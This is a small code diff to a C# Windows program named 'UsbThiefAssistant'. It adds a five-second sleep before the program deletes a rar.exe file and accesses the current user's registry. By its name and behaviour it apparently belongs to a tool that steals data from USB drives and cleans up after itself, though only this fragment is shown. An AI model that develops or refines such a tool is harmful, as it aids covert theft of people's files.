@@ -7,6 +7,7 @@ using System.Net;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace UsbThiefAssistant
@@ -146,6 +147,7 @@ namespace UsbThiefAssistant
         {
             try
             {
+                Thread.Sleep(5000);
                 if (File.Exists(path + "\\rar.exe"))
                     File.Delete(path + "\\rar.exe");
                 RegistryKey rk = Registry.CurrentUser;
